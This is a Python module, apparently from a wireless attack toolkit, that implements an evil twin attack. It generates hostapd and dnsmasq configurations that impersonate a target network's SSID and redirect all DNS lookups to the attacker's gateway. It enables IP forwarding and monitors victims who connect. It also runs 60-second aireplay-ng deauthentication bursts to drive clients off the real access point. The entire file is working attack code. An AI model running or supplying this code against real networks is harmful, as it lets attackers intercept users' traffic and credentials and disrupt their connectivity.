"""Evil twin attack module.

Creates a rogue access point that mimics a legitimate network using
hostapd (AP) and dnsmasq (DHCP/DNS).  Optionally deauthenticates real
clients to force them onto the evil twin.
"""

from __future__ import annotations

import asyncio
import re
import time
from dataclasses import dataclass, field
from pathlib import Path

from wafford.constants import TEMP_DIR
from wafford.core.base import AttackPhase, AttackResult, BaseAttack
from wafford.exceptions import AttackError, ValidationError


@dataclass
class TwinStatus:
    """Live status of the evil twin AP."""

    ap_running: bool = False
    dhcp_running: bool = False
    ssid: str = ""
    channel: int = 0
    interface: str = ""
    clients_connected: set[str] = field(default_factory=set)
    hostapd_pid: int = 0
    dnsmasq_pid: int = 0
    deauth_rounds: int = 0
    elapsed: float = 0.0


class EvilTwin(BaseAttack):
    """Rogue AP that impersonates a target network.

    Generates hostapd and dnsmasq configs, starts both daemons, and
    monitors connected clients.  Optionally deauthenticates clients
    from the real AP to nudge them towards the twin.
    """

    name = "evil_twin"

    def __init__(
        self,
        interface: str = "",
        *,
        config_dir: str | Path | None = None,
    ) -> None:
        super().__init__(interface)
        self.config_dir = Path(config_dir) if config_dir else TEMP_DIR / "evil_twin"
        self.config_dir.mkdir(parents=True, exist_ok=True)
        self.twin = TwinStatus(interface=interface)
        self._hostapd_proc: asyncio.subprocess.Process | None = None
        self._dnsmasq_proc: asyncio.subprocess.Process | None = None
        self._monitor_task: asyncio.Task[None] | None = None

    # ── Public API ────────────────────────────────────────────────────────

    async def start(  # type: ignore[override]
        self,
        ssid: str,
        channel: int = 6,
        dns_server: str = "8.8.8.8",
        gateway: str = "10.0.0.1",
        auth_type: str = "open",
    ) -> AttackResult:
        """Create and launch the rogue AP.

        Parameters
        ----------
        ssid:
            SSID to broadcast.
        channel:
            Radio channel for the AP.
        dns_server:
            Upstream DNS for dnsmasq.
        gateway:
            Gateway IP handed out via DHCP.
        auth_type:
            ``'open'``, ``'wpa2'``, or ``'wpa2_captive'``.
        """
        if not ssid:
            raise ValidationError("SSID must not be empty", field="ssid")
        if not 1 <= channel <= 194:
            raise ValidationError(f"Invalid channel: {channel}", field="channel")

        self._require_tool("hostapd")
        self._require_tool("dnsmasq")

        self.twin.ssid = ssid
        self.twin.channel = channel
        self.status.phase = AttackPhase.RUNNING
        self._emit("attack.started")
        self._emit("eviltwin.starting", {"ssid": ssid, "channel": channel})

        # 1 — Generate configs
        hostapd_conf = self._write_hostapd_config(ssid, channel, auth_type)
        dnsmasq_conf = self._write_dnsmasq_config(gateway, dns_server)

        # 2 — Kill conflicting processes
        await self._kill_conflicts()

        # 3 — Start hostapd
        self._hostapd_proc = await asyncio.create_subprocess_exec(
            "hostapd", hostapd_conf,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        self._processes.append(self._hostapd_proc)
        self.twin.hostapd_pid = self._hostapd_proc.pid
        self._info("hostapd started (pid %d)", self._hostapd_proc.pid)

        # Wait for hostapd to come up
        await asyncio.sleep(2)
        if self._hostapd_proc.returncode is not None:
            _, stderr = await self._hostapd_proc.communicate()
            raise AttackError(f"hostapd exited early: {stderr.decode(errors='replace')[:300]}")

        self.twin.ap_running = True

        # 4 — Start dnsmasq
        self._dnsmasq_proc = await asyncio.create_subprocess_exec(
            "dnsmasq",
            "-C", dnsmasq_conf,
            "--no-daemon",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        self._processes.append(self._dnsmasq_proc)
        self.twin.dnsmasq_pid = self._dnsmasq_proc.pid
        self.twin.dhcp_running = True
        self._info("dnsmasq started (pid %d)", self._dnsmasq_proc.pid)

        # 5 — Enable IP forwarding
        await self._run_cmd(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            timeout=5,
        )

        # 6 — Start client monitor
        self._monitor_task = asyncio.create_task(self._monitor_clients_loop())
        self._tasks.append(self._monitor_task)

        self.twin.elapsed = 0.0
        self._emit("eviltwin.ap_running", {"ssid": ssid, "pid": self.twin.hostapd_pid})

        return AttackResult(
            success=True,
            message=(
                f"Evil twin AP '{ssid}' running on ch{channel} "
                f"(hostapd pid {self.twin.hostapd_pid})"
            ),
            time_taken=0.0,
            extra={"twin": self.twin},
        )

    async def deauth_clients(self, real_bssid: str) -> AttackResult:
        """Deauth clients from *real_bssid* to push them to the twin."""
        self._validate_mac(real_bssid, "bssid")
        self._info("Deauthing clients from real AP %s", real_bssid)

        deauth_count = 0
        deadline = time.monotonic() + 60  # 60 s deauth burst
        while time.monotonic() < deadline and not self._cancel_event.is_set():
            argv = [
                "aireplay-ng", "--deauth", "5",
                "-a", real_bssid,
                "--ignore-negative-one",
                self.interface,
            ]
            rc, _, _ = await self._run_cmd(argv, timeout=10)
            deauth_count += 1
            self.twin.deauth_rounds = deauth_count
            self._emit("eviltwin.deauth_round", {"round": deauth_count})
            try:
                await asyncio.wait_for(self._cancel_event.wait(), timeout=3.0)
                break
            except TimeoutError:
                pass

        return AttackResult(
            success=deauth_count > 0,
            message=f"Sent {deauth_count} deauth rounds against {real_bssid}",
            extra={"deauth_rounds": deauth_count},
        )

    async def stop(self) -> AttackResult:  # type: ignore[override]
        """Shut down all evil twin components."""
        self._info("Stopping evil twin…")
        self._cancel_event.set()
        self.status.phase = AttackPhase.STOPPING

        if self._monitor_task and not self._monitor_task.done():
            self._monitor_task.cancel()

        await self._kill_proc(self._dnsmasq_proc) if self._dnsmasq_proc else None
        await self._kill_proc(self._hostapd_proc) if self._hostapd_proc else None
        self.twin.ap_running = False
        self.twin.dhcp_running = False

        # Disable IP forwarding
        await self._run_cmd(["sysctl", "-w", "net.ipv4.ip_forward=0"], timeout=5)

        # Remove configs
        for f in self.config_dir.iterdir():
            f.unlink(missing_ok=True)

        self._emit("eviltwin.stopped", {})
        return AttackResult(success=True, message="Evil twin stopped")

    def get_status(self) -> TwinStatus:
        return self.twin

    # ── Config generators ─────────────────────────────────────────────────

    def generate_hostapd_config(
        self,
        ssid: str,
        channel: int,
        interface: str,
        auth_type: str = "open",
    ) -> str:
        """Return the path to a generated hostapd.conf."""
        return self._write_hostapd_config(ssid, channel, auth_type, interface)

    def generate_dnsmasq_config(
        self,
        interface: str,
        gateway: str,
        dns_server: str,
    ) -> str:
        """Return the path to a generated dnsmasq.conf."""
        return self._write_dnsmasq_config(gateway, dns_server, interface)

    # ── Client monitoring ─────────────────────────────────────────────────

    async def monitor_connected_clients(self) -> list[str]:
        """Parse ``hostapd_cli all_sta`` and return list of MACs."""
        rc, stdout, _ = await self._run_cmd(
            ["hostapd_cli", "-i", self.interface, "all_sta"],
            timeout=5,
        )
        if rc != 0:
            return []
        macs: list[str] = []
        for line in stdout.splitlines():
            m = re.match(r"^([0-9A-Fa-f:]{17})", line.strip())
            if m:
                macs.append(m.group(1).upper())
        self.twin.clients_connected = set(macs)
        return macs

    async def _monitor_clients_loop(self) -> None:
        """Periodically poll hostapd for connected stations."""
        while not self._cancel_event.is_set():
            try:
                await self.monitor_connected_clients()
                if self.twin.clients_connected:
                    self._emit(
                        "eviltwin.clients",
                        {"count": len(self.twin.clients_connected)},
                    )
            except asyncio.CancelledError:
                break
            except Exception:
                self._debug("Client monitor error", exc_info=True)
            try:
                await asyncio.wait_for(self._cancel_event.wait(), timeout=5.0)
                break
            except TimeoutError:
                pass

    # ── Internals ─────────────────────────────────────────────────────────

    def _write_hostapd_config(
        self,
        ssid: str,
        channel: int,
        auth_type: str = "open",
        iface: str | None = None,
    ) -> str:
        iface = iface or self.interface
        conf_path = str(self.config_dir / "hostapd.conf")
        lines = [
            f"interface={iface}",
            f"ssid={ssid}",
            f"channel={channel}",
            "hw_mode=g",
            "driver=nl80211",
            "logger_syslog=-1",
            "logger_syslog_level=2",
            "wmm_enabled=0",
            "macaddr_acl=0",
            "auth_algs=1",
            "ignore_broadcast_ssid=0",
        ]
        if auth_type in ("wpa2", "wpa2_captive"):
            psk = "wafford12345"  # default PSK for audit
            lines += [
                "wpa=2",
                "wpa_passphrase=" + psk,
                "wpa_key_mgmt=WPA-PSK",
                "wpa_pairwise=CCMP",
                "rsn_pairwise=CCMP",
            ]
        with Path(conf_path).open("w") as fh:
            fh.write("\n".join(lines) + "\n")
        self._debug("hostapd.conf written to %s", conf_path)
        return conf_path

    def _write_dnsmasq_config(
        self,
        gateway: str = "10.0.0.1",
        dns_server: str = "8.8.8.8",
        iface: str | None = None,
    ) -> str:
        iface = iface or self.interface
        conf_path = str(self.config_dir / "dnsmasq.conf")
        net = ".".join(gateway.split(".")[:3])  # e.g. 10.0.0
        lines = [
            f"interface={iface}",
            "dhcp-authoritative",
            "dhcp-sequential",
            "log-dhcp",
            f"dhcp-option=option:router,{gateway}",
            f"dhcp-option=option:dns-server,{dns_server}",
            f"dhcp-range={net}.100,{net}.254,255.255.255.0,1h",
            f"address=/#/{gateway}",
            "no-resolv",
            f"server={dns_server}",
        ]
        with Path(conf_path).open("w") as fh:
            fh.write("\n".join(lines) + "\n")
        self._debug("dnsmasq.conf written to %s", conf_path)
        return conf_path

    async def _kill_conflicts(self) -> None:
        """Kill existing hostapd / dnsmasq instances."""
        for prog in ("hostapd", "dnsmasq"):
            await self._run_cmd(["killall", "-9", prog], timeout=5)

    async def _cleanup(self) -> None:
        if self._monitor_task and not self._monitor_task.done():
            self._monitor_task.cancel()
        await self._kill_proc(self._dnsmasq_proc) if self._dnsmasq_proc else None
        await self._kill_proc(self._hostapd_proc) if self._hostapd_proc else None
        await self._run_cmd(["sysctl", "-w", "net.ipv4.ip_forward=0"], timeout=5)
        await super()._cleanup()

    @staticmethod
    def _validate_mac(mac: str, field_name: str = "mac") -> None:
        parts = mac.split(":")
        if len(parts) != 6 or not all(0 <= int(p, 16) <= 255 for p in parts):
            raise ValidationError(f"Invalid MAC address: {mac}", field=field_name)
